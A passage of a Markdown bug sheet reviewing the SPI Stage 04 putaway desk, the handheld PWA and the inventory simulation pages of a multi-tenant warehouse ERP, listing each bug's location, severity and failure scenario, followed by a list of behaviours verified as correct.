| SCN-F-35 | PWA | `start_url`, `/sw.js`, `/manifest.json`, `/api` and `/putaway-scan` are absolute, and `scope:"/"` makes the installed app the whole ERP origin. | manifest.json:5-6; `welcome.blade.php`:33, 43; Scan.tsx:216, 249, 631 | S3 | Plausible | Breaks under a sub-path APP_URL such as `localhost/Cross_Border_Command/public`. |
| SCN-F-36 | PWA | `sw.js` re-issues every page fetch from the worker. ERP pages unregister it on every load and the scanner re-registers it. There is no offline fallback. | `public/sw.js`:17-19; welcome.blade.php:38-52 | S3 | Plausible | A possible cause of the client-certificate "hang" the page complains about (Scan.tsx:237-243); churn on every navigation. |

---

## 5. SPI Stage 04 desk (backend)

> The tenant global scope (`BelongsToTenant`) makes cross-tenant SPI, box, row, task, lock and occupancy ids 404, and `validatePlace` re-anchors zone/rack/shelf ids to the invoice's warehouse. Tenant isolation on the desk side holds. The problems below are about rules, state and races.

| ID | Area | Bug | Where | Sev | Status | Failure scenario |
|---|---|---|---|---|---|---|
| S4-B-01 | SEC | No permission check on any Stage 04 endpoint (SPI-C-01 extends here). Unlike the rest of SPI, a client admin with no branch is NOT blocked here. | `routes/api.php`:586-610, 1361-1370; AllocCtl / TaskCtl / PutCtl | S1 | Open | Any active user (HR, for example) can assign or reassign boxes, confirm placement by hand, raise tasks, or cancel any floor task. |
| S4-B-02 | BE | `assign()` never re-runs the engine's hard rules. `validatePlace()` checks ownership and status only; capacity, cold chain, hazardous, temperature range and height are enforced only by the UI greying out tiles. The `lockForUpdate` on the shelf row has no check after it. | AllocCtl:252-253, 276-277, 301-306, 460-506; Engine:96-131, 228-241 | S1 | Open | POST `assign` with a -20 °C cold-chain or hazardous box on an ambient shelf → accepted. A 500 kg box on a shelf with 10 kg free → `used_weight_kg` above max. |
| S4-B-03 | BE | Stage 04 has no SPI status guard anywhere (`isEditable()` / `isCancelled()`). | AllocCtl `assign`:237, `confirmManual`:372; TaskCtl `store`:64, `cancel`:326; PutCtl:94, 160, 258 | S2 | Open | Boxes of a cancelled or closed SPI are assigned or placed; capacity is reserved for goods no longer covered. |
| S4-B-04 | BE | `setStorageType` lets the warehouse change after boxes are drafted or placed. | PutCtl:128 | S2 | Open | Boxes drafted in WH-1, then switched to WH-2: WH-1 occupancy and locks stay live, placed rows still point at WH-1, and the next `assign` is validated against WH-2. |
| S4-B-05 | BE | A full no-rack zone is never refused: `freeM3 = max(0, cap-used)` is 0, the refusal fires only `if ($freeM3 > 0 && …)`, and `best` = smallest `free_m3`. Unmeasured zones (cap 0) outrank every measured zone. | Engine:238; Finder:259-261, 292 | S2 | Open | A 100%-used zone is shown as eligible and is the Section A recommendation. |
| S4-B-06 | BE/INT | The legacy hand-scan chain is still routed. `POST putaway/scan` moves zone/rack/shelf ids on rows with no occupancy, lock or task coordination. `PUT putaway/{row}/confirm` sets only `confirmed_at/by/condition`: no `status=placed`, no `verify_method`, no `occupy()`, no lock release, no open-task check. Not used by the current UI but reachable. | `routes/api.php`:586-593; PutCtl:193-235, 258-300 | S2 | Open | A box with an open Zebra task is confirmed here. The handheld `commit()` then returns "already placed" and the task stays pending forever, occupancy stays `reserved`, the shelf stays locked, and `status='pending'` sits next to `confirmed_at` (counted in `idx_putaway_open_*`). |
| S4-B-07 | BE | Cancel and handheld complete race: both check state outside the transaction with no `lockForUpdate`. | TaskCtl:329-353; ScanCtl:259-292 | S2 | Plausible | The handheld commits while a cancel that has already passed `isOpen()` writes `task=cancelled`, `row.status='draft'`. Result: `confirmed_at` set, status draft, task cancelled, box on the shelf. |
| S4-B-08 | INT | Editing a draft box's weight or dimensions after `assign` doesn't resync the occupancy row (extends SPI3-B-02, which covers placed boxes). | BoxCtl:221 vs AllocCtl:301-306 | S2 | Open | A box reserved at 5 kg is edited to 80 kg; shelf counters still say 5 kg. |
| S4-B-09 | BE | `assign` accepts boxes with no weight or dimensions, although the summary marks them as blocking. | SpiSummaryService.php:424-434 vs AllocCtl:252-306 | S2 | Open | A 0 kg / 0 cm³ box fits everywhere and consumes nothing, so counters under-report. |
| S4-B-10 | BE | Re-assigning a box to the location it already holds: `acquireOrExtend` returns the existing lock, then `releaseLockFor($old)` releases that same lock. | AllocCtl:279-298, 331 | S3 | Open | The UI shows `lock.expires_at` while the shelf is actually open to everyone. |
| S4-B-11 | BE | No heartbeat endpoint exists, although the comments say "the open screen pings last_heartbeat_at". Every desk lock dies 30 minutes after `assign`, and `store()` then creates a task with no lock. | `app/Models/Inventory/LocationLock.php`:21-23; LockSvc:25; TaskCtl:131 | S3 | Open | A task raised 31 minutes after drafting has no location lock. |
| S4-B-12 | BE | Duplicate assign / task / confirm pre-checks run outside the transaction with no row lock. The partial unique indexes catch the collision, but as a raw 500. | AllocCtl:256-268, 390-395; TaskCtl:78-83; PutCtl:193 | S3 | Open | A double-clicked "Send to Zebra" → one 200 and one 500 (SQLSTATE 23505) instead of a 422. |
| S4-B-13 | DB | `capacity_reserved_pct` is decimal(6,2), max 9999.99. Combined with S4-B-02 it overflows. | TaskCtl:115, 413-420; tasks migration | S3 | Open | A 1000 kg box on a 5 kg shelf (20000%) → `scan-task` 500 numeric overflow. |
| S4-B-14 | DB | Task code allocation: (a) a null branch takes no lock; (b) the unique on (client, branch, code) doesn't apply to NULL branch in PG; (c) after 999 a day, `substr(-3)` wraps to 001. | TaskCtl:392-410 | S3 | Open | Duplicate ZT codes read out over the radio. |
| S4-B-15 | BE | The rack tree ignores rack and zone status (`refuseShelf` checks shelf status only); `modeCounts` counts shelves in inactive zones. | Finder:110-135, 320-333; Engine:99 | S3 | Open | A shelf on an inactive rack is recommended, then `assign` 422s. |
| S4-B-16 | BE | A box's own live reservation counts against it in `shelfLoads` / `invoiceMates`. | Finder:115-139, 183 | S3 | Open | A 40 kg draft box on a 50 kg shelf shows that shelf as "over_weight" for itself; `used_pct_after` counts it twice. |
| S4-B-17 | BE | Volume is never a hard rule for shelves: `checkShelf` compares the box with the whole shelf volume, not the free volume, and a fail doesn't make the shelf ineligible. | Engine:96-131, 152-158 | S3 | Open | A shelf full by volume stays eligible while its tile shows "Dimensions fit ✗". |
| S4-B-18 | BE | Fridge zones' `capacity_litres` is ignored; capacity is read only from `usable_volume ?: volume`. | Finder:259 | S3 | Open | A fridge zone reads as unmeasured and accepts unlimited boxes. |
| S4-B-19 | BE | The temperature check accepts half ranges and doesn't require zone `cold_chain=1`. | Engine:254-266 | S3 | Plausible | A zone with only `temp_max_c=25` "covers" a -20..-18 °C box. |
| S4-B-20 | BE | The recommendation is non-deterministic: zones and racks have no `orderBy` and ties keep whichever comes first. `scoreZone()` is never called. | Finder:100, 110, 186-191, 292; Engine:298 | S3 | Open | The same request recommends a different shelf on different runs. |
| S4-B-21 | BE | Allocation ignores `wh_type`, so a 3PL ("summary only") warehouse gets zone/shelf allocation, locks and occupancy. | AllocCtl:460-506 vs PutCtl:47-52 | S3 | Open | Rack/shelf recorded in a third-party warehouse. |
| S4-B-22 | BE | Typed codes are matched with `ilike` and no escaping. | PutCtl:437, 461 | S3 | Open | Typing `%` matches an arbitrary zone, and the scan is accepted. |
| S4-B-23 | BE | A legacy box scan on an SPI with no warehouse hits NOT NULL `warehouse_id`. | PutCtl:173, 229 | S3 | Open | SQLSTATE 23502 500 instead of a 422. |
| S4-B-24 | BE | N+1 in task activity: one `users` query per log row. | TaskCtl:282 | S3 | Open | 50 scans → 50 extra queries. |
| S4-B-25 | BE | The queue endpoint's `per_page` is unbounded and unvalidated. | TaskCtl:209 | S3 | Open | `per_page=-1` → PG "LIMIT must not be negative" 500; `per_page=100000` dumps the table. |
| S4-B-26 | BE | `printSticker` (POST) re-stamps `sticker_printed_at` on every call, while download stamps it only the first time. Neither checks `isEditable` / cancelled. | BoxCtl:300, 341-358 | S3 | Open | The first-print time is lost; stickers print for cancelled SPIs. |
| S4-B-27 | BE | The sticker blade header comment is stale ("QR carries the BOX CODE … a URL would break the scan"), and there is no tenant branding (no BrandingResolver or logo). | `resources/views/pdf/spi-box-sticker.blade.php`:8-10 | S3 | Open | Doc drift; an unbranded label. |
| S4-B-28 | BE | Branch on SpiActivity / SpiScanLog / legacy SpiPutaway rows comes from TenantContext, not the SPI. It is NULL for a client admin. | `SupplierInvoiceService.php`:302-310; PutCtl:226-233 | S3 | Open | Client-admin trail rows show in every branch; branch-user rows carry the user's branch, not the invoice's. |
| S4-B-29 | DB | Status and `verify_method` are inconsistent. The model docblock says "no status column on purpose", but migration 000009 adds one. `verify_method` is documented as `manual\|zebra`, but the handheld writes `'scan'`. | `app/Models/P2p/SpiPutaway.php`:96-101; ScanCtl:282 | S3 | Open | Reports filtering `verify_method='zebra'` find nothing. |
| S4-B-30 | BE | Cancelling a task writes no SPI activity row; only the inventory activity log gets it. | TaskCtl:326-380 | S3 | Open | SPI history shows the task created, then nothing. |
| S4-B-31 | BE | `SpiPutawayController` uses `findOrFail`, which gives a generic "No query results for model…" (with a trace in debug). The other Stage 04 controllers return named 404 messages. | PutCtl:43, 265 | S3 | Open | Inconsistent error shape on the same screen. |
| S4-B-32 | BE | Two crossing reassigns can deadlock: each locks its new shelf row, then `syncShelf` updates the old one. | AllocCtl:276-298 | S3 | Plausible | A: SH-1→SH-2 while B: SH-2→SH-1 → PG deadlock 500. |
| S4-B-33 | BE | Shelf `dim_unit='m'` dimensions are returned raw as cm, and the `shelfVolumeM3()` fallback assumes cm. | Finder:164-168; Engine:210-217 | S3 | Open (labels) / Plausible (volume) | A 2 m × 1 m shelf shows "2 × 1 cm"; the fallback volume is about 1e-6 of the true value. |
| S4-B-34 | BE | Locks are exclusive per operator for a whole shelf or a whole no-rack zone, while capacity is already reserved separately. | AllocCtl:274-282; Engine:104, 231 | S3 | Open (design) | Operator B gets a 409 "in use" on a 90%-free floor zone because A has one draft box there. |
| S4-B-35 | BE | `suggested_shelf_id` is stored without validation. | AllocCtl:248, 322 | S3 | Open | Any integer, including another tenant's shelf id, lands in `p2p_spi_putaways`. |
| S4-B-36 | INT | Stage 3 judges cold chain by flag NAME; Stage 4 judges it by `behaviour`. | BoxCtl:655 vs Finder:76-90 | S3 | Plausible | "Frozen" with behaviour cold_chain: Stage 3 refuses the temperature range. "Cold Chain" with behaviour none: Stage 4 doesn't demand a cold shelf. |
| S4-B-37 | INT | `assign` files the row under the warehouse's branch, not the operator's. | AllocCtl:504 | S3 | Plausible | The branch-scoped GET hides the row from the board for a user of another branch. |

---

## 6. SPI Stage 04 desk (frontend)

| ID | Area | Bug | Where | Sev | Status | Failure scenario |
|---|---|---|---|---|---|---|
| S4-F-01 ✔ | INT | **No allocation or task API is wired.** `spi-api.ts` has no function for `POST putaway/assign`, `{row}/confirm-manual`, `{row}/scan-task`, `GET putaway/tasks` or `tasks/{id}/cancel`; only board, locations and sticker are called. "Complete Putaway" only sets `placedAt` in React state. | Step4:2014-2023; `invoice/spi-api.ts`:312-451 | S1 | Open | The banner says "locked at SH-05 … cannot be undone", but no row, occupancy or lock is written and the shelf stays free for others. On reload the box is Pending again. |
| S4-F-02 ✔ | INT | The Zebra task exists only in the browser. The id is minted client-side as `ZT-${ymd}-001`, the same for every box. | Step4:954-958, 2021 | S1 | Open | A real TC27 scanning the box gets "No put-away initiated for B-001" (ScanCtl:379-382). The handheld queue is always empty. |
| S4-F-03 | FE | "Prototype mode → Simulate correct" is shown to every production user. It marks the box "Putaway Completed · Verified via Using Zebra Device" with a random `TPA-…-${Math.random()}` number. | `steps/PutawayScanTask.tsx`:114, 202-219, 293-301; Step4:1616-1626 | S1 | Open | A fake device verification is presented as real. |
| S4-F-04 | FE | Step4 is conditionally mounted, so leaving Stage 04 throws away `placedAt`, `scanTask` and the logs. | `invoice/InvoiceForm.tsx`:487 | S2 | Open | Back to Stage 03 and forward again → every box Pending. |
| S4-F-05 | FE | The board loads once per `boxKey`: no polling, no refetch on focus or after actions. The poll-friendly `GET /putaway/tasks/{task}` is unused. The UI claims "Scans … are received here automatically". | Step4:831-838; PutawayScanTask.tsx:289 | S2 | Open | The desk never sees the handheld's completion. |
| S4-F-06 | FE | Server draft and task state isn't restored. `board.boxes[].task` / `destination` feed the badge only; `scanTask` and `spot` are never set from them. | Step4:460-477 | S2 | Open | A box that is `awaiting_scan` on the server offers "Putaway Method" again and can't open or cancel the real task. |
| S4-F-07 | FE | "Next: Putaway Summary" is enabled on step 03 before anything is confirmed. | Step4:1333-1357, 1526-1559 | S2 | Open | It jumps to the lcStep-3 stub, and the 3-step strip shows all steps "Completed". |
| S4-F-08 | FE | `placedVia` isn't reset when the box changes. | Step4:1013-1018, 1060-1063, 2018 | S2 | Open | A manual confirm on box B shows "Allocation TPA-… · Verified via Using Zebra Device" with box A's number, and the log records it. |
| S4-F-09 | FE | `readOnly` (a view-only SPI) only blocks clicking box cards. | Step4:217, 1075-1078 | S2 | Open | The first box is auto-selected and the whole mode / location / method / Complete flow is usable. Sticker print still POSTs and stamps `sticker_printed_at`. |
| S4-F-10 | FE | Print Label calls `window.print()` on the whole SPI page, with no `@media print` for `.vsm-*` / `.invf-stk*`. | Step4:931-932; `BoxStickerModal.tsx`:89-90; `PutawayBoxSticker.tsx`:132 | S2 | Open | Prints the full page and overlay, not a 4×6 label. |
| S4-F-11 | FE/INT | The location QR on the confirm card encodes `` `${warehouse name}/${spot id}` `` (e.g. "kuhi/41"), and zone and shelf ids collide in that format. | Step4:1439; ScanCtl:771-800 | S2 | Open | Scanned on the Zebra → "That is not a Cross Border label". |
| S4-F-12 | FE/INT | Box QR previews don't match the printed PDF. Step4 and PutawayStickerModal encode the bare `String(box.id)`, which works only because of SEC-07. BoxStickerModal encodes `BOX\|B-001\|codes\|qty`, which is rejected as unreadable. The real PDF carries the signed `/ps/` URL. | Step4:1438, 1725; `PutawayStickerModal.tsx`:122; BoxStickerModal.tsx:18-19; BoxCtl:332-366 | S2 | Open | The on-screen QR and the printed label behave differently. |
| S4-F-13 | FE | On the last stage, "Map Invoice / Update Invoice" returns early (`if (stage >= last) return;`). Stage 04 has no finish or persist action. | InvoiceForm.tsx:374 | S2 | Open | The final button does nothing. |
| S4-F-14 | FE | Damaged and mismatch (QC-hold) boxes go through the same storage flow; the computed `group` / `sections` are unused. | Step4:859-874, 2036-2147 | S2 | Plausible (business rule) | A QC-hold carton is put on a sellable shelf. |
| S4-F-15 | FE | Disposition ignores box condition. | Step4:439-445 | S2 | Plausible | A `severe`-condition carton with remark "correct" lands in "Shipment Dispatch". |
| S4-F-16 | FE | The board load error is stored but never rendered. | Step4:829, 836 | S3 | Open | On failure every box silently shows "Pending". |
| S4-F-17 | FE | The "0 / 2 scans" chip is hard-coded and ignores `scanSteps`. | `PutawayConfirmPlacement.tsx`:342 | S3 | Open | Progress never moves. |
| S4-F-18 | FE | The wrong-shelf message hard-codes 'SH-101' as the shelf that was scanned. | PutawayScanTask.tsx:130 | S3 | Open | Wrong shelf named to the operator. |
| S4-F-19 | FE | `trail.map` returns an un-keyed `<>` fragment. | PutawayConfirmPlacement.tsx:271-278 | S3 | Open | React key warning; possible row mix-ups. |
| S4-F-20 | FE | "Change" / Back to step 02 calls `setSpot(null)` and refetches on every `lcStep` change to 1. | Step4:1112-1124, 1441 | S3 | Open | The selected location is lost. |
| S4-F-21 | FE | Dead code: the footer lcStep-0 branch, which also duplicates `askStorageMode` without PoApiError handling; the Back `disabled={lcStep===0}`; unused `placed`, `hazCount`, `coldCount`, `pct`, `group`, `sections`, `scope`, `condLabel`, `condNote`, `KV` and Ico*; `putaway-demo.ts` (imported nowhere); `.s4-panels:fullscreen` CSS. | Step4:853-874, 1021-1024, 1500-1555; `invoice-form.css`:3393-3394 | S3 | Open | Cleanup. |
| S4-F-22 | FE | The Review pane button reads "Location allocated" but its `onNext` is `askStorageMode`. | `PutawayReviewBox.tsx`:332-334; Step4:1492 | S3 | Open | It reopens the storage-mode chooser for a placed box. |
| S4-F-23 | UI | The sticker "SPI Number" shows `invoice_no` (the supplier's invoice number), not the SPI code. | Step4:1716 | S3 | Open | The label and the PDF filename disagree. |
| S4-F-24 | UI | The sticker "SKU" field shows `HSN …`. | Step4:1722 | S3 | Open | Wrong field label/value. |
| S4-F-25 | UI | `packedOnOf` falls back to today when `created_at` is missing. | Step4:560 | S3 | Open | A fake packed date. |
| S4-F-26 | UI | `CONDITION_LABEL` maps both `major` and `severe` to "Critical Damage", while the TONE table expects "Major Damage". | Step4:553 | S3 | Open | Wrong label and colour. |
| S4-F-27 | UI | Direct-SPI (no PO) boxes with remark "correct" show "Extra Quantity". The Confirm card uses `REMARK_OF[type]` and Review uses `products[0].remark`. | Step4:204, 444, 1430, 1484 | S3 | Open | Two screens disagree for mixed boxes. |
| S4-F-28 | UI | Section A (rack mode) labels the box's cold/haz flags as the location's; floor mode correctly uses `rec.cold_chain`. | `PutawaySelectLocation.tsx`:375-376 vs 712-713 | S3 | Open | Misleading location badges. |
| S4-F-29 | FE | Scan Logs are session-local, attributed to the fixed string "SPI Putaway Desk", with placeholder text. The backend `/putaway/tasks/{id}/activity` is unused. | Step4:769, 780-783 | S3 | Open | No real audit trail on the desk. |
| S4-F-30 | FE | The task-created log is de-duplicated by the constant `ZT-…-001`. | Step4:986-996, 1052-1056 | S3 | Open | A second task after a cancel is not logged. |
| S4-F-31 | INT | Blob downloads use `responseType:'blob'`, so the error body is a Blob and the server message is lost. PutawayStickerModal swallows the error entirely. | spi-api.ts:16-19, 335-337; `putaway-data.ts`:216; PutawayStickerModal.tsx:68-69 | S3 | Open | Shows "Request failed with status code 4xx" instead of "Box B-003 belongs to …". |
| S4-F-32 | FE | `window.open(url,'_blank','noopener')` runs after an await (user gesture lost) and returns null with `noopener`. | PutawayStickerModal.tsx:60 | S3 | Plausible | The print pop-up is blocked and nothing tells the user. |
| S4-F-33 | FE | No busy or disabled feedback on PDF / Print; only a ref guard. BoxStickerModal does this correctly. | Step4:905-938; PutawayBoxSticker.tsx:131-134 | S3 | Open | Users click repeatedly thinking nothing happened. |
| S4-F-34 | UI | PutawaySummary shows a reserved or draft location as the "Temporary Putaway Location" as if placed; `box.placed` / `header.placedBoxes` are unused. | `PutawaySummary.tsx`:168, 412-414; PutawayStickerModal.tsx:140 | S3 | Open | Unplaced boxes look placed. |
| S4-F-35 | FE | PutawaySummary swallows a failed boxes call with `.catch(()=>[])`. | putaway-data.ts:204 | S3 | Open | Every sticker button is disabled with "could not be matched". |
| S4-F-36 | UI | Hard-coded colours bypass dark mode: inline `#dc2626` / `#b45309` remark colours, an inline padding block, and an inline gradient. | PutawaySummary.tsx:216, 318; `StorageSelectionModal.tsx`:187 | S3 | Open | Unreadable in dark mode. |
| S4-F-37 | UI | Thin dark-mode coverage: `.s4mx-*` has 8 dark rules out of 241; `putaway-sticker.css` has 13 dark rules and no `@media` at all. | invoice-form.css; putaway-sticker.css | S3 | Plausible | Light patches in dark mode; mobile layout unhandled. |
| S4-F-38 | UI | The Scan Logs popover has fixed geometry: 400 px wide, at least 320 px tall. | invoice-form.css:6391; Step4:711-712 | S3 | Open | Overflows a phone width or runs off-screen. |
| S4-F-39 | A11y | BoxCard is a clickable `div` with no role, tabIndex or key handler; the panel head toggles by mouse only; the s4qm dialogs have no Esc, focus trap or initial focus. | Step4:214-218, 1191, 1632-2230 | S3 | Open | Boxes can't be picked by keyboard. |
| S4-F-40 | FE | `FsLayer` portals dialogs into `.s4-panels`, so toggling Full View remounts open dialogs. | Step4:110-112, 1574 | S3 | Plausible | Internal dialog state, such as scan legs, resets. |
| S4-F-41 | FE | `console.error` runs on every SPI API failure, including 422 field errors. | spi-api.ts:20 | S3 | Open | Console noise in production. |
| S4-F-42 | UI | The StorageSelectionModal "Available" badge is static. | StorageSelectionModal.tsx:331-333, 360 | S3 | Open | A made-up status. |
| S4-F-43 | FE | The Rack and Shelf QR modals lack the `if(!x.apiId)` guard that the Warehouse and Zone modals have. | `inventory-management/rack/RackQrModal.tsx`, `ShelfQrModal.tsx` | S3 | Open | Low impact (`apiId` is typed as a number). |

---

## 7. Inventory simulation pages (`/inventory/*`)

| ID | Area | Bug | Where | Sev | Status | Failure scenario |
|---|---|---|---|---|---|---|
| INV-01 | FE/UI | The Inventory menu opens a **localStorage simulation shown as a real module**: dummy BOXES / RACKS / SHELVES, `TENANT='12'` hard-coded, and allocations and logs that exist only in the browser. | `resources/js/pages/inventory/putAwayStore.ts`:4-25, 84-105, 208-226, 340-457; `InventoryPutAway.tsx`:7-12, 337-349; `InventoryScanLog.tsx`:6, 23-24 | S2 | Open | Users of any tenant see fake put-aways as real; every tenant's demo stickers are generated as tenant 12. |
| INV-02 | INT/SEC | The demo sticker sheet's "real scannable codes" are validly signed with the shared secret (SEC-05). Box ids 1041-1044 can resolve to real SpiBox ids in the device's tenant on `/ps/`. | `InventoryStickers.tsx`:51-62; putAwayStore.ts:87-92; ScanCtl:334 | S2 | Plausible | A printed demo label satisfies a real open task. |
| INV-03 | FE | The scan log and allocations in localStorage aren't namespaced by user or tenant. | putAwayStore.ts:210-214 | S3 | Open | On a shared PC the next user, from any tenant, sees the previous user's log and "committed allocations". |

---

## 8. Docs

| ID | Area | Bug | Where | Sev | Status |
|---|---|---|---|---|---|
| DOC-01 | DOC | The docs are stale against the code: the install doc says 301 (the code sends 307); the install doc gives `/putaway-scan/enroll` (the QR is `/s/enroll`); README §1 "no token, no login, no enrolment link" vs install doc §6, which needs both; SCAN_TO_URL_REDIRECT_SHEET cites Scan.tsx:127 for enroll (now about line 208), says unknown phones are blocked by device-check (`/ps/` actually 401s on `/scan/putaway/session`), and predates mTLS and the `/s/` redirect on scan.kryptone.ai. | `docs/p2p/PUTAWAY_APP_INSTALL.md`; certs README; `docs/SCAN_TO_URL_REDIRECT_SHEET.md` | S3 | Open |

---

## 9. Verified correct (no bug)

**Device trust**
- Admin device endpoints scope by `client_id` from `auth()->user()` (`where(client_id)->findOrFail`); a cross-tenant id gives 404, and `client_id` is never read from the body.
- `enroll` rejects another client's token (404, generic message) and suspended or retired devices (403).
- The token is `CBCD-` plus 40 random characters (about 206 bits). Only the SHA-256 is stored (`token_hash` unique, `$hidden`), and input is capped at 100 chars.
- Rotation invalidates the old token immediately; suspended and retired devices are refused on both the cert and token paths.
- `POST /scan-devices/enroll` is not shadowed by the apiResource (checked with `route:list`).
- `device-check` always returns 200, so the SPA 401-logout never fires from it.
- The enroll link uses a URL **fragment**, and `history.replaceState` strips it.
- No `.p12`, `.pem`, `.key`, `.crt` or `.pfx` is tracked or ever was in git history; `.gitignore` covers `storage/certs` and `public/*.p12` / `*.crt`.
- tls-proxy always deletes the client-sent `x-scan-cert-cn` and sets it only when `socket.authorized`; the documented scan vhost (`SSLVerifyClient require` + unset/set) is a correct pattern.

**Handheld API**
- Task lookups (`findTask`, `session`, box→task, due-tasks) filter `client_id = device->client_id`, so there is no task IDOR across clients. SpiBox lookup is client-scoped.
- The actor is limited to the device's client, and soft-deleted users get `device_unclaimed`.
- `confirm` / `complete` require an open task. The wrong-box and location-kind checks (`levelIdFor`) stop rack 1 being read as shelf 1. `locationUsable` checks active status and same warehouse.
- The partial unique `uq_putaway_task_open_box` allows one open task per box; DB check constraints exist on task and putaway status.
- Occupancy counters are recomputed, not incremented, so a retry cannot double-count capacity. The `commit()` writes are in a single transaction.
- `StickerKey::parse` uses `hash_equals`, requires exactly 6 parts and the `CBC1` prefix.
- The 3-strike reset and the stale window are enforced server-side.

**Handheld screen**
- It uses its own `fetch`, not axios, for device calls (no Bearer, no branch_id, no 401 redirect), with a 15 s AbortController that is cleared in `finally`.
- Enter followed by auto-submit doesn't double-submit; input is trimmed and CR/LF stripped.
- Listeners and timers are cleaned up; there are no `setInterval`s, no `any`, no `console.*`, and no TS errors.
- All CSS is prefixed `.pwscan`, so nothing leaks into the main app.
- The service worker does no caching and is registered only on scanner paths over https.
- The scanner routes are matched before the auth and plan gates.

**Desk side**
- The tenant global scope 404s cross-tenant and cross-branch SPI, box, row, task, lock and occupancy ids.
- `setStorageType` scopes the warehouse by client plus branch and requires it to be active.
- `validatePlace` re-anchors zone/rack/shelf to the invoice's warehouse, so a cross-tenant shelf can't be assigned.
- Working guards: `assign` refuses placed boxes and boxes with an open task; `confirmManual` refuses placed, unassigned or open-task rows; `cancel` refuses non-open tasks.
- The lock insert sits in a savepoint (the loser gets a clean 409), with lazy reaping of expired locks; every division in the finder and engine is zero-guarded.
- Desk `confirmManual` and handheld `commit` write the same columns; only the legacy `confirm` diverges (S4-B-06).
- The sticker blade escapes every output (`{{ }}`). `downloadSticker` is behind Sanctum, scoped to box and invoice, and stamps `sticker_printed_at` only once.
- Inventory master deletes are refused while live occupancy exists.
- The four location QR modals encode the server's signed `/ps/` URL, which `classify()` parses. `putAwayStore` sign() matches `StickerKey.php` byte for byte.
- `board` / `locations` / summary field names match the backend; no TS errors in the reviewed files.

---

## Related existing sheets
- `docs/SPI_STAGES_1-3_BUG_SHEET.md`: SPI-C-01 (no permissions) and SPI3-B-02 / SPI3-B-04 / SPI3-I-05 also affect Stage 04 and are referenced, not duplicated, here.
- `docs/SCAN_TO_URL_REDIRECT_SHEET.md`: superseded in parts (see DOC-01).
